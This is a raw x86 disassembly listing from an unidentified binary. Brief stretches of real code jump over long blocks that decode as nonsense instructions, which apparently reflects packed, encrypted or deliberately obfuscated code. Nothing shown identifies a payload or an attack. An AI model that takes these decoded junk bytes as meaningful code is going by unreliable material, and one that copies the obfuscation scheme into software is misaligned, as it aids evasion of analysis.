  4121b3:	mov    edx,0x3c6c7e8e
  4121b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121b9:	add    eax,0xcb582065
  4121be:	push   eax
  4121bf:	jmp    0x412172
  4121c1:	xor    eax,0x7fbf8d0e
  4121c6:	test   DWORD PTR [edx+0x55926e4d],eax
  4121cc:	and    BYTE PTR [edi+edi*4+0x5a010127],ch
  4121d3:	cwde   
  4121d4:	aaa    
  4121d5:	pop    ebp
  4121d6:	test   eax,0x416b0551
  4121db:	mov    BYTE PTR [eax-0x17],bl
  4121de:	sub    al,0xfb
  4121e0:	lods   eax,DWORD PTR ds:[esi]
  4121e1:	xor    al,0x46
  4121e3:	sar    BYTE PTR [esi+0x49],1
  4121e6:	fistp  WORD PTR [edx+0xe1b3514]
  4121ec:	ins    BYTE PTR es:[edi],dx
  4121ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121ee:	test   al,0x37
  4121f0:	ja     0x412271
  4121f2:	dec    eax
  4121f3:	adc    bl,BYTE PTR [edx-0x17e6cac4]
  4121f9:	sbb    eax,0xd9d3873e
  4121fe:	repnz in eax,0xc6
  412201:	out    0x1f,al
  412203:	out    0xd8,eax
  412205:	lds    esi,FWORD PTR [edi]
  412207:	mov    ah,0x30
  412209:	(bad)  
  41220a:	cli    
  41220b:	fsub   DWORD PTR [eax-0x3c84df98]
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225ec
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	shl    BYTE PTR [ebp+0x21],cl
  4122a4:	jle    0x4122a4
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	xlat   BYTE PTR ds:[ebx]
  4122ae:	jo     0x4122da
  4122b0:	imul   DWORD PTR [edx]
  4122b2:	mov    ecx,0x72ebc557
  4122b7:	in     eax,0xf9
  4122b9:	add    al,0x5e
  4122bb:	jno    0x41230a
  4122bd:	cs sbb al,0x78
  4122c0:	lods   eax,DWORD PTR ds:[esi]
  4122c1:	cmp    cl,BYTE PTR [edx]
  4122c3:	popf   
  4122c4:	out    0xc8,al
  4122c6:	jno    0x41228a
  4122c8:	mov    ebx,0x2ed2c159
  4122cd:	imul   DWORD PTR [edi+0x74]
  4122d0:	shr    BYTE PTR [edx],0xa2
  4122d3:	jno    0x412317
  4122d5:	retf   0xb5fb
  4122d8:	(bad)  
  4122da:	mov    edx,0x7b4c30bb
  4122df:	mov    cl,0xad
  4122e1:	jmp    0x3339c7c6
  4122e6:	rcr    bh,0xb6
  4122e9:	add    eax,ecx
  4122eb:	sar    cl,0x1e
  4122ee:	or     dh,BYTE PTR ds:0xea4dcd0a
  4122f4:	xchg   edi,eax
  4122f5:	add    ebp,DWORD PTR [ecx+0x33]
  4122f8:	and    eax,0x7ec3d161
  4122fd:	pop    edx
  4122fe:	in     al,0x9e
  412300:	popa   
  412301:	adc    BYTE PTR [esi-0x747ab061],dh
  412307:	mov    ebp,0x336b26b9
  41230c:	and    BYTE PTR [edi],0xae
  41230f:	arpl   WORD PTR [edx-0x77],si
  412312:	inc    esi
  412313:	mov    eax,0x255a8ffb
  412318:	push   cs
  412319:	sbb    DWORD PTR [edx],0x65
  41231c:	jns    0x41234e
  41231e:	cmp    al,0x70
  412320:	cmp    BYTE PTR [edx-0x397a69c1],al
  412326:	push   cs
  412327:	ret    
  412328:	shl    ch,1
  41232a:	cmp    BYTE PTR [edx],ah
  41232c:	xlat   BYTE PTR ds:[ebx]
  41232d:	out    dx,eax
  41232e:	cwde   
  41232f:	mov    esp,0x1467ce6e
  412334:	cmp    ch,ch
  412336:	jbe    0x412351
  412338:	sbb    esi,eax
  41233a:	jmp    0xd1a2dd4c
  41233f:	scas   al,BYTE PTR es:[edi]
  412340:	jbe    0x4122e5
  412342:	rcl    BYTE PTR [ecx-0x2b85211e],cl
  412348:	push   esp
  412349:	out    0x78,eax
  41234b:	mov    DWORD PTR [esi-0x7a42b2a],eax
  412351:	or     eax,0x8a26b960
  412356:	ret    0xeb00
  412359:	add    esi,DWORD PTR [ebp+0x76be2528]
  41235f:	lods   eax,DWORD PTR ds:[esi]
  412360:	dec    esp
  412361:	int3   
  412362:	inc    esp
  412363:	ret    
  412364:	loop   0x4123bb
  412366:	sbb    eax,0xd841328c
  41236b:	js     0x4123df
  41236d:	xchg   esi,eax
  41236e:	cmp    cl,BYTE PTR [ebx+0x7b2b3089]
  412374:	xchg   ebp,eax
  412375:	dec    edx
  412376:	ja     0x412366
  412378:	sub    BYTE PTR [edi-0x78d0b43b],ah
  41237e:	not    BYTE PTR [edx+0x544dd28d]
  412384:	sbb    ebx,DWORD PTR [esi+0x75]
  412387:	out    dx,al
  412388:	xor    eax,0x2778a695
  41238d:	das    
  41238e:	jbe    0x412322
  412390:	imul   eax,DWORD PTR [edx],0x23
  412393:	test   al,0x1a
  412395:	mul    BYTE PTR [ebp-0x643bb3b9]
  41239b:	dec    esp
  41239c:	arpl   si,dx
  41239e:	(bad)  
  41239f:	popa   
  4123a0:	pop    eax
  4123a1:	inc    eax
  4123a2:	jo     0x412387
  4123a4:	xor    al,0xd5
  4123a6:	daa    
  4123a7:	sbb    eax,0xdd4df859
  4123ac:	and    esp,esi
  4123ae:	mov    BYTE PTR [ebp+0x5e],0xcc
  4123b2:	jmp    0x8fd8:0x91572452
  4123b9:	mov    BYTE PTR [edi-0x2e],dh
  4123bc:	(bad)  
  4123bd:	mov    ch,ch
  4123bf:	adc    ecx,DWORD PTR [esi-0xd362357]
  4123c5:	in     eax,0xfd
  4123c7:	repz sar DWORD PTR [esi+esi*2],1
  4123cb:	xor    eax,0x2fe970f2
  4123d0:	xchg   ecx,eax
  4123d1:	shl    BYTE PTR [edi],0x2e
  4123d4:	and    al,0xd9
  4123d6:	xchg   esi,eax
  4123d7:	or     BYTE PTR [edx-0x7b9b3f21],dl
  4123dd:	push   ecx
  4123de:	mul    BYTE PTR [ebx+0x7f099e74]
  4123e4:	repnz xchg edx,eax
  4123e6:	es and al,cl
  4123e9:	xor    BYTE PTR [edi+0x62a913f3],dh
  4123ef:	stc    
  4123f0:	mov    bl,0x9e
  4123f2:	retf   
  4123f3:	shr    BYTE PTR [edx+ecx*2+0x76],0xc4
  4123f8:	in     al,dx
  4123f9:	mov    ?,WORD PTR [esi+0x4b]
  4123fc:	dec    ebp
  4123fd:	dec    ebp
  4123fe:	push   esp
  4123ff:	loop   0x41244f
  412401:	mov    al,0x11
  412403:	cld    
  412404:	in     al,0x1
  412406:	js     0x4123d0
  412408:	mov    WORD PTR [edi-0x203f6f17],ds
  41240e:	loopne 0x412457
  412410:	mov    BYTE PTR [ecx],bl
  412412:	jp     0x4123bd
  412414:	shr    BYTE PTR [ecx+0x74],1
  412417:	daa    
  412418:	rcl    BYTE PTR [ebx+0x36c958b3],1
  41241e:	mov    ah,0xdf
  412420:	fist   WORD PTR [esi+0x14]
  412423:	fld    st(2)
  412425:	xor    edi,ecx
  412427:	pusha  
  412428:	mov    bh,0x31
  41242a:	shl    ecx,0x8f
  41242d:	clc    
  41242e:	bound  esi,QWORD PTR [edi]
  412430:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412432:	xchg   esi,eax
  412433:	sbb    al,0xeb
  412435:	inc    ebp
  412436:	push   esi
  412437:	stos   DWORD PTR es:[edi],eax
  412438:	jbe    0x412413
  41243a:	and    al,0x68
  41243c:	cld    
  41243d:	test   eax,0xebe135d0
  412442:	jmp    0x412430
  412444:	and    DWORD PTR [ebx],ebp
  412446:	mov    WORD PTR [ebx+0x3a],?
  412449:	add    bh,BYTE PTR [esi-0x69]
  41244c:	std    
  41244d:	imul   ebx,ebx,0x44bed0c3
  412453:	push   ebx
  412454:	mov    esp,0xf5f323d9
  412459:	js     0x41246f
  41245b:	xor    al,0xe3
  41245d:	stos   DWORD PTR es:[edi],eax
  41245e:	sub    eax,0x7d0a6215
  412463:	aad    0xc4
  412465:	cmp    ebx,DWORD PTR [edi]
  412467:	(bad)  
  412468:	aam    0x3c
  41246a:	adc    eax,0xc47d462a
  41246f:	pushf  
  412470:	sar    BYTE PTR [esi],0xff
  412473:	ins    DWORD PTR es:[edi],dx
  412474:	xchg   ecx,eax
  412475:	fmul   QWORD PTR [ebx]
  412477:	xor    DWORD PTR [edx-0x21],0x74566c9c
  41247e:	leave  
  41247f:	add    ah,al
  412481:	push   esi
  412482:	repnz mov bh,0xe9
  412485:	push   ds
  412486:	sbb    ecx,esp
  412488:	ins    BYTE PTR es:[edi],dx
  412489:	nop
  41248a:	push   cs
  41248b:	pop    eax
  41248c:	inc    edi
  41248d:	lahf   
  41248e:	push   ebp
  41248f:	dec    edi
  412490:	pop    ds
  412491:	mov    ah,0xde
  412493:	xchg   ebp,eax
  412494:	popf   
  412495:	fnstsw ax
  412497:	inc    ecx
  412498:	into   
  412499:	mov    DWORD PTR [ebp+0x69b20f18],ebx
  41249f:	and    ebp,esi
  4124a1:	adc    BYTE PTR [edi],al
  4124a3:	push   ebp
  4124a4:	mov    ds:0x115b4002,al
  4124a9:	stos   BYTE PTR es:[edi],al
  4124aa:	leave  
  4124ab:	cli    
  4124ac:	dec    ecx
  4124ad:	mov    WORD PTR [eax-0x19],cs
  4124b0:	and    bl,BYTE PTR [ecx-0x9]
  4124b3:	sti    
  4124b4:	stc    
  4124b5:	adc    DWORD PTR [edx+0x213604a3],eax
  4124bb:	in     al,0x8b
  4124bd:	pop    esi
  4124be:	in     eax,dx
  4124bf:	pop    edi
  4124c0:	ja     0x412474
  4124c2:	mov    bh,0xd0
  4124c4:	sub    eax,0xd23bed94
  4124c9:	and    bl,0x94
  4124cc:	and    al,0x69
  4124ce:	xlat   BYTE PTR ds:[ebx]
  4124cf:	addr16 leave 
  4124d1:	dec    ebp
  4124d2:	jmp    0x4124dd
  4124d4:	xchg   ecx,eax
  4124d5:	mov    esi,0xcc7760bf
  4124da:	jmp    0x6d5:0xbbcd4ec9
  4124e1:	shr    BYTE PTR [esi],0x1c
  4124e4:	and    BYTE PTR [eax+0x5b],ah
  4124e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124e8:	call   0x4c67:0xa01864dd
  4124ef:	mov    cl,0x46
  4124f1:	mov    edi,0x7720ceb9
  4124f6:	mov    esp,0xf36e27ce
  4124fb:	mov    ebp,0xdf20fd83
  412500:	lahf   
  412501:	mov    eax,0x3b6804f
  412506:	rcl    BYTE PTR [ebx],1
  412508:	icebp  
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x42206f
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x4124be
  412538:	bndstx [esi+0x57],(bad)
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	pop    es
  412544:	pop    es
  412545:	sub    bh,dh
  412547:	test   DWORD PTR [esp+edi*2+0x42d2d382],ecx
  41254e:	xchg   ebx,eax
  41254f:	mov    dh,0x27
  412551:	loopne 0x41257f
  412553:	xor    BYTE PTR [edx+esi*8+0x628c170f],bh
  41255a:	test   DWORD PTR [ebx],esi
  41255c:	sbb    eax,0x6968a6c
  412562:	fisttp DWORD PTR [esi-0x7dfa87c7]
  412568:	mov    al,0xc3
  41256a:	icebp  
  41256b:	test   BYTE PTR [edi-0x75690d14],ah
  412571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412572:	and    eax,0x185d07e7
  412577:	pop    edi
  412578:	cs sti 
  41257a:	shl    ch,1
  41257c:	gs push ss
  41257e:	mov    dl,0x1c
  412580:	stc    
  412581:	jl     0x41254c
  412583:	in     al,0x52
  412585:	clc    
  412586:	push   ecx
  412587:	cs push edx
  412589:	mov    esp,0x87860c37
  41258e:	cmp    bl,ch
  412590:	les    ebp,FWORD PTR [edx]
  412592:	out    dx,eax
  412593:	adc    edi,esp
  412595:	xor    DWORD PTR [eax-0x76e1c6cd],ecx
  41259b:	xchg   cl,al
  41259d:	daa    
  41259e:	cmp    edx,DWORD PTR [eax-0x75]
  4125a1:	dec    edi
  4125a2:	jmp    0x412579
  4125a4:	in     al,dx
  4125a5:	arpl   WORD PTR [ebp+0x4071547f],dx
  4125ab:	arpl   ax,ax
  4125ad:	sub    al,0xc1
  4125af:	pop    eax
  4125b0:	fucom  st(2)
  4125b2:	fisub  WORD PTR [edx+0x29]
  4125b5:	add    bl,BYTE PTR [esi-0x5e1a2d53]
  4125bb:	paddsw mm6,mm6
  4125be:	mov    eax,ds:0xbd4b9b08
  4125c3:	jge    0x4125b5
  4125c5:	lds    ebp,FWORD PTR ds:0x76f97183
  4125cb:	pushf  
  4125cc:	pop    esi
  4125cd:	sbb    eax,0xa0e6033
  4125d2:	sbb    eax,DWORD PTR [ebx]
  4125d4:	mov    dl,0x61
  4125d6:	pop    esi
  4125d7:	push   edx
  4125d8:	jae    0x412655
  4125da:	movsx  eax,WORD PTR [edi]
  4125dd:	enter  0x3ea4,0xf5
  4125e1:	inc    ebx
  4125e2:	rol    edx,1
  4125e4:	mov    cs,ebx
  4125e6:	int3   
  4125e7:	pop    eax
  4125e8:	cmp    edx,0x14
  4125eb:	push   ds
  4125ec:	leave  
  4125ed:	ror    DWORD PTR [ebx],cl
  4125ef:	xchg   ecx,eax
  4125f0:	sub    eax,0x7f874549
  4125f5:	out    dx,al
  4125f6:	rol    eax,cl
  4125f8:	mov    ds:0x223615b9,al
  4125fd:	out    dx,eax
  4125fe:	add    ecx,DWORD PTR [eax+0x17288461]
  412604:	sub    eax,0xcb55a6f8
  412609:	repnz add eax,0x28d51f8b
  41260f:	loope  0x41259d
  412611:	xor    BYTE PTR [eax],cl
  412613:	jns    0x4125a4
  412615:	dec    ebx
  412616:	xchg   esi,eax
  412617:	(bad)  
  412618:	(bad)  
  412619:	mov    eax,0x83ab8831
  41261e:	jne    0x412686
  412620:	stc    
  412621:	fwait
  412622:	cwde   
  412623:	pop    esi
  412624:	fcomi  st,st(1)
  412626:	loope  0x4126a0
  412628:	dec    edx
  412629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41262a:	fwait
  41262b:	or     dl,dh
  41262d:	mov    ds,WORD PTR [ebp-0x69]
  412630:	xchg   ecx,eax
  412631:	in     eax,dx
  412632:	out    0x9c,al
  412634:	rcl    BYTE PTR [edi+0x72],0x59
  412638:	inc    BYTE PTR [bx+si]
  41263b:	cs ins DWORD PTR es:[edi],dx
  41263d:	icebp  
  41263e:	jecxz  0x4125e0
  412640:	xor    BYTE PTR [eax-0x7778c937],bh
  412646:	scas   eax,DWORD PTR es:[edi]
  412647:	call   0xa0e35d73
  41264c:	in     eax,0xb6
  41264e:	pop    edx
  41264f:	cli    
  412650:	add    eax,0x6366c681
  412655:	cli    
  412656:	push   ebx
  412657:	xchg   edi,eax
  412658:	das    
  412659:	mov    al,al
  41265b:	outs   dx,BYTE PTR ds:[esi]
  41265c:	xchg   esp,eax
  41265d:	xchg   esi,eax
  41265e:	rol    DWORD PTR [ecx-0x1d],cl
  412661:	and    DWORD PTR [ecx+0x1a],ecx
  412664:	dec    ebx
  412665:	jg     0x4126c4
  412667:	pusha  
  412668:	jge    0x4125eb
  41266a:	in     eax,dx
  41266b:	mov    ah,0xa3
  41266d:	mov    al,ds:0x65eed205
  412672:	retf   0x2674
  412675:	xchg   edi,eax
  412676:	loop   0x4126e7
  412678:	mov    ds:0xe9bd70ac,al
  41267d:	mov    dl,bl
  41267f:	int3   
  412680:	imul   edi,DWORD PTR [eax-0x5984f792],0xffffffa8
  412687:	pop    eax
  412688:	jo     0x412611
  41268a:	xor    DWORD PTR [ebx-0x21],eax
  41268d:	mov    edi,0x2ea23763
  412692:	(bad)  
  412693:	jle    0x4126ce
  412695:	repnz add al,0x48
  412698:	cmp    cl,BYTE PTR [eax+0x45]
  41269b:	push   ebp
  41269c:	add    eax,0xb4a15179
  4126a1:	call   0xf347:0xa0f38177
  4126a8:	out    dx,al
  4126a9:	jg     0x41264d
  4126ab:	dec    esi
  4126ac:	or     BYTE PTR [ebp-0x6b],dl
  4126af:	test   BYTE PTR [ecx],ah
  4126b1:	mul    DWORD PTR [edi-0x47]
  4126b4:	lea    ebp,[esi-0x7e]
  4126b7:	leave  
  4126b8:	or     ch,al
  4126ba:	mov    esp,DWORD PTR [ebx]
  4126bc:	jbe    0x412659
  4126be:	inc    ebp
  4126bf:	aad    0x85
  4126c1:	or     BYTE PTR [edi-0x2b4f476c],cl
  4126c7:	dec    eax
  4126c8:	cld    
  4126c9:	mov    gs,WORD PTR [ecx+0x5b]
  4126cc:	xor    BYTE PTR fs:[edi],bh
  4126cf:	loop   0x4126e6
  4126d1:	call   DWORD PTR [ecx]
  4126d3:	fisubr DWORD PTR [edi+ebx*2+0x56]
  4126d7:	call   0x57f4:0xc89dbc0c
  4126de:	fs mov ebp,0xe3d08ea8
  4126e4:	bnd jl 0x4126f6
  4126e7:	loopne 0x412714
  4126e9:	sti    
  4126ea:	cmp    ecx,DWORD PTR [ecx]
  4126ec:	push   ds
  4126ed:	push   eax
  4126ee:	pop    esi
  4126ef:	mov    cl,0xb0
  4126f1:	mov    eax,ds:0x4fa5e715
  4126f6:	dec    ebx
  4126f7:	sar    BYTE PTR [eax+0x29],1
  4126fa:	in     eax,dx
  4126fb:	inc    eax
  4126fc:	xor    DWORD PTR [ebx],esi
  4126fe:	jbe    0x41277c
  412700:	pop    esi
  412701:	popf   
  412702:	add    edx,edx
  412704:	cs cld 
  412706:	jbe    0x4126f5
  412708:	mov    bh,0x5a
  41270a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41270b:	add    BYTE PTR [ebx],dh
  41270d:	int3   
  41270e:	and    ch,BYTE PTR [ebp-0x5]
  412711:	icebp  
  412712:	sbb    dl,cl
  412714:	clc    
  412715:	xchg   ebp,eax
  412716:	cld    
  412717:	push   eax
  412718:	cld    
  412719:	add    dl,BYTE PTR [ebx+edi*2-0x18b20ba3]
  412720:	aam    0x12
  412722:	inc    ecx
  412723:	rol    BYTE PTR [edx+esi*2-0x73],cl
  412727:	(bad)  
  412729:	inc    edx
  41272a:	shl    BYTE PTR [eax],cl
  41272c:	jae    0x412714
  41272e:	test   eax,0x6bfdc509
  412733:	cmp    al,0xa0
  412735:	push   0xffffffdc
  412737:	mov    ebp,DWORD PTR [ebx-0x5fa33d95]
  41273d:	sbb    al,dh
  41273f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412740:	in     eax,dx
  412741:	das    
  412742:	xchg   ebx,eax
  412743:	jmp    0xdce2bb82
  412748:	sbb    al,0x1e
  41274a:	pop    ebp
  41274b:	fdivr  st,st(4)
  41274d:	inc    edi
  41274e:	push   ebx
  41274f:	ds and al,0x66
  412752:	into   
  412753:	ds pop ds
  412755:	dec    eax
  412756:	imul   ecx,esi,0xe113d3d2
  41275c:	call   0xafed:0x6968f372
  412763:	and    eax,0x4d9dccc3
  412768:	inc    ecx
  412769:	(bad)  
  41276a:	sbb    al,0xc
  41276c:	mov    al,0xaf
  41276e:	nop
  41276f:	aaa    
  412770:	mov    ah,0x7b
  412772:	lods   al,BYTE PTR ds:[esi]
  412773:	aaa    
  412774:	and    esp,DWORD PTR [esi]
  412776:	pushf  
  412777:	add    dl,BYTE PTR [ebx-0x707119e9]
  41277d:	fs add al,0x57
  412780:	test   al,0x36
  412782:	cmp    DWORD PTR [edi],ecx
  412784:	ret    
  412785:	xor    ch,bh
  412787:	adc    dh,BYTE PTR [edi]
  412789:	(bad)  
  41278b:	int    0x5
  41278d:	cmc    
  41278e:	loop   0x41280c
  412790:	dec    ebx
  412791:	sbb    BYTE PTR [edi+0x43927704],ch
  412797:	in     eax,dx
  412798:	hlt    
  412799:	xchg   dh,dh
  41279b:	sbb    eax,edx
  41279d:	mov    edx,DWORD PTR ds:0x4225ec
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225ec
  4127d5:	mov    ds:0x4225f4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xb06d64c0
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    cl,ah
  4128b3:	xor    BYTE PTR [edi+0x2f],bl
  4128b6:	(bad)  
  4128b7:	les    ebx,FWORD PTR [edi+0x7d5832b1]
  4128bd:	retf   0x4c8
  4128c0:	mov    ebp,0xcf573b2d
  4128c5:	and    BYTE PTR [esi+0x40],dh
  4128c8:	xor    DWORD PTR [eax-0x441748e4],ecx
  4128ce:	jle    0x4128b7
  4128d0:	push   ds
  4128d1:	in     eax,dx
  4128d2:	ror    DWORD PTR [ecx+esi*2-0x29],0x53
  4128d7:	pop    ss
  4128d8:	xchg   esi,eax
  4128d9:	cmp    ebp,DWORD PTR [ecx+0x4c3b12e0]
  4128df:	fmul   DWORD PTR [edi]
  4128e1:	xchg   ecx,eax
  4128e2:	enter  0x40fc,0x3e
  4128e6:	retf   0xeeab
  4128e9:	or     eax,0xa9bd6dae
  4128ee:	jp     0x4128a0
  4128f0:	je     0x41290b
  4128f2:	ret    
  4128f3:	pop    ebp
  4128f4:	pop    edi
  4128f5:	mov    ?,WORD PTR [eax+ebx*4-0x41d49ac8]
  4128fc:	pop    eax
  4128fd:	xchg   ecx,eax
  4128fe:	jns    0x412880
  412900:	xor    DWORD PTR ds:0xa9de97f3,edx
  412906:	enter  0x5856,0xd4
  41290a:	test   eax,0x1ccea5bf
  41290f:	cmp    al,0x2f
  412911:	sub    DWORD PTR [edi+0x36],ebx
  412914:	aam    0xb8
  412916:	ds pusha 
  412918:	gs add eax,0xf0c5a76e
  41291e:	shr    cl,0xcc
  412921:	(bad)  
  412922:	and    eax,0x85a5f43b
  412927:	mov    DWORD PTR [edx+0x66],edi
  41292a:	add    al,0xdc
  41292c:	xor    eax,0xf46e6d8e
  412931:	loope  0x4129ad
  412933:	sub    edx,DWORD PTR [edx-0x4fe85506]
  412939:	xor    DWORD PTR [esi],0xf85de0a
  41293f:	dec    eax
  412940:	mov    bl,0x6e
  412942:	mov    al,ds:0xe75cf0c5
  412947:	outs   dx,BYTE PTR ds:[esi]
  412948:	dec    ebx
  412949:	data16 or BYTE PTR [eax+0x31decf42],ah
  412950:	xchg   DWORD PTR [esi],edi
  412952:	dec    ebx
  412953:	arpl   WORD PTR [ebx-0xfe1b63b],cx
  412959:	mov    es,WORD PTR [edi-0x41ef997f]
  41295f:	out    0x55,eax
  412961:	loope  0x41291d
  412963:	rcr    BYTE PTR [edi+0x3f4aa802],1
  412969:	jns    0x4129bc
  41296b:	mov    esi,0xe73e0b4b
  412970:	add    al,0xcd
  412972:	ss arpl bp,si
  412975:	aaa    
  412976:	stos   DWORD PTR es:[edi],eax
  412977:	inc    eax
  412978:	scas   eax,DWORD PTR es:[edi]
  412979:	retf   
  41297a:	jo     0x412949
  41297c:	out    dx,eax
  41297d:	and    DWORD PTR [ecx-0x5f3a88b0],0x7506515c
  412987:	mov    bl,0x29
  412989:	cmp    BYTE PTR [ebx-0x36d6b131],ah
  41298f:	push   ss
  412990:	adc    eax,0x77c9d982
  412995:	loope  0x412996
  412997:	cmp    BYTE PTR [edi+eax*2+0x503c4cc9],dl
  41299e:	xor    eax,0x573202d4
  4129a3:	sbb    bl,BYTE PTR [edi]
  4129a5:	pop    ds
  4129a6:	pop    edi
  4129a7:	cmp    ecx,DWORD PTR [esi+edx*2+0x1270108c]
  4129ae:	pusha  
  4129af:	loop   0x412981
  4129b1:	pop    ss
  4129b2:	pop    esi
  4129b3:	icebp  
  4129b4:	jae    0x412951
  4129b6:	fidiv  DWORD PTR ds:0xbb2b44e3
  4129bc:	mov    edi,esi
  4129be:	fistp  QWORD PTR [edx]
  4129c0:	jae    0x4129c9
  4129c2:	out    0x7a,eax
  4129c4:	jmp    0x2e9b7224
  4129c9:	out    dx,al
  4129ca:	mov    ss,esp
  4129cc:	addr16 pop eax
  4129ce:	stc    
  4129cf:	xor    edx,edx
  4129d1:	loope  0x412960
  4129d3:	push   cs
  4129d4:	inc    edx
  4129d5:	xchg   esi,eax
  4129d6:	or     al,0xaf
  4129d8:	jecxz  0x412a2f
  4129da:	dec    esp
  4129db:	jl     0x412a5b
  4129dd:	leave  
  4129de:	sub    dh,dh
  4129e0:	xchg   edi,eax
  4129e1:	inc    eax
  4129e2:	cmp    dl,BYTE PTR es:[eax+0x7b]
  4129e6:	dec    ebp
  4129e7:	xor    al,ah
  4129e9:	in     al,dx
  4129ea:	pop    ebx
  4129eb:	xor    BYTE PTR [esi],cl
  4129ed:	xor    ebp,ebx
  4129ef:	sbb    BYTE PTR [esi],al
  4129f1:	stos   DWORD PTR es:[edi],eax
  4129f2:	pusha  
  4129f3:	inc    edx
  4129f4:	inc    esi
  4129f5:	mov    edx,DWORD PTR [ebx-0x39]
  4129f8:	mov    esi,0x956dad4d
  4129fd:	push   eax
  4129fe:	jle    0x4129d6
  412a00:	loope  0x4129a4
  412a02:	sti    
